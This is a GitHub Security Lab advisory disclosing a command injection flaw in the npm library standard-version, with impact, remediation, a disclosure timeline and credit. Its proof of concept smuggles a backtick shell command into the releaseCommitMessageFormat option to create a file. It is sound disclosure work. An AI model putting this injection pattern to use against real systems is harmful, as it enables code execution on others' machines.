<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">August 6, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-111: Command injection vulnerability in standard-version</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/kevinbackhouse">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/4358136?s=35" height="35" width="35">
        <span>Kevin Backhouse</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>The <code class="language-plaintext highlighter-rouge">standardVersion</code> function has a command injection vulnerability. Clients of the <code class="language-plaintext highlighter-rouge">standard-version</code> library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.</p>

<h2 id="product">Product</h2>
<p>Standard Version</p>

<h2 id="tested-version">Tested Version</h2>
<p>Commit <a href="https://github.com/conventional-changelog/standard-version/tree/2f04ac8fc1c134a1981c23a093d4eece77d0bbb9/">2f04ac8</a></p>

<h2 id="details">Details</h2>

<h3 id="issue-1-command-injection-in-standardversion">Issue 1: Command injection in <code class="language-plaintext highlighter-rouge">standardVersion</code></h3>

<p>The following proof-of-concept illustrates the vulnerability. First install Standard Version and create an empty git repo to run the PoC in:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install standard-version
git init
echo "foo" &gt; foo.txt # the git repo has to be non-empty
git add foo.txt
git commit -am "initial commit"
</code></pre></div></div>

<p>Now create a file with the following contents:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var fs = require("fs");
// setting up a bit of environment
fs.writeFileSync("package.json", '{"name": "foo", "version": "1.0.0"}');

const standardVersion = require('standard-version')

standardVersion({
  noVerify: true,
  infile: 'foo.txt',
  releaseCommitMessageFormat: "bla `touch exploit`"
})
</code></pre></div></div>

<p>and run it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node test.js
</code></pre></div></div>

<p>Notice that a file named <code class="language-plaintext highlighter-rouge">exploit</code> has been created.</p>

<p>This vulnerability is similar to command injection vulnerabilities that have been found in other Javascript libraries. Here are some examples:
<a href="https://github.com/advisories/GHSA-m8xj-5v73-3hh8">CVE-2020-7646</a>,
<a href="https://github.com/advisories/GHSA-426h-24vj-qwxf">CVE-2020-7614</a>,
<a href="https://github.com/advisories/GHSA-5q88-cjfq-g2mh">CVE-2020-7597</a>,
<a href="https://github.com/advisories/GHSA-4gp3-p7ph-x2jr">CVE-2019-10778</a>,
<a href="https://github.com/advisories/GHSA-84cm-v6jp-gjmr">CVE-2019-10776</a>,
<a href="https://github.com/advisories/GHSA-9jm3-5835-537m">CVE-2018-16462</a>,
<a href="https://github.com/advisories/GHSA-7g2w-6r25-2j7p">CVE-2018-16461</a>,
<a href="https://github.com/advisories/GHSA-cfhg-9x44-78h2">CVE-2018-16460</a>,
<a href="https://github.com/advisories/GHSA-pp57-mqmh-44h7">CVE-2018-13797</a>,
<a href="https://github.com/advisories/GHSA-c9j3-wqph-5xx9">CVE-2018-3786</a>,
<a href="https://github.com/advisories/GHSA-wjr4-2jgw-hmv8">CVE-2018-3772</a>,
<a href="https://github.com/advisories/GHSA-3pxp-6963-46r9">CVE-2018-3746</a>,
<a href="https://github.com/advisories/GHSA-jcw8-r9xm-32c6">CVE-2017-16100</a>,
<a href="https://github.com/advisories/GHSA-qh2h-chj9-jffq">CVE-2017-16042</a>.</p>

<p>We have written a <a href="https://codeql.com">CodeQL</a> query, which automatically detects this vulnerability. You can see the results of the query on the <code class="language-plaintext highlighter-rouge">standard-version</code> project <a href="https://lgtm.com/query/237522640229151035/">here</a>.</p>

<h4 id="impact">Impact</h4>

<p>This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.</p>

<h4 id="remediation">Remediation</h4>

<p>We recommend not using an API that can interpret a string as a shell command. For example, use <a href="https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback"><code class="language-plaintext highlighter-rouge">child_process.execFile</code></a> instead of <a href="https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback"><code class="language-plaintext highlighter-rouge">child_process.exec</code></a>.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2020-05-19: Emailed report to joe.bottigliero@gmail.com</li>
  <li>2020-06-15: Created an <a href="https://github.com/conventional-changelog/standard-version/issues/602">issue</a> on their repo.</li>
  <li>2020-07-12: GHSA published: <a href="https://github.com/conventional-changelog/standard-version/security/advisories/GHSA-7xcx-6wjh-7xp2">GHSA-7xcx-6wjh-7xp2</a>. Fixed version is 8.0.1.</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub Engineer <a href="https://github.com/erik-krogh">@erik-krogh (Erik Krogh Kristensen)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2020-111</code> in any communication regarding this issue.</p>

    